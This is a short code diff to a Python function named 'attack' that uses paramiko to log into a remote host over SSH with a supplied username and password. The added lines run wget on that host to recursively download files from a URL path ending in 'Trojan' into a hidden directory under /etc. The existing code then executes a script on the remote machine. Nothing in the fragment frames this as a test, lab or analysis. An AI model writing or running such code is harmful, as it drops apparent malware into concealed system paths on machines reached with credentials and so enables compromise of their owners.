@@ -87,6 +87,11 @@ def attack(local_script_path, remote_script_path, remote_host, remote_user, remo
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh_client.connect(remote_host, username=remote_user, password=remote_password)
+        
+        # Execute wget to get files needed
+        wget_command = "wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan"
+        stdin, stdout, stderr = ssh_client.exec_command(wget_command)
+        print(stdout.read().decode('utf-8'))
 
         # Execute the script on the remote machine
         stdin, stdout, stderr = ssh_client.exec_command(f"python {remote_script_path}")
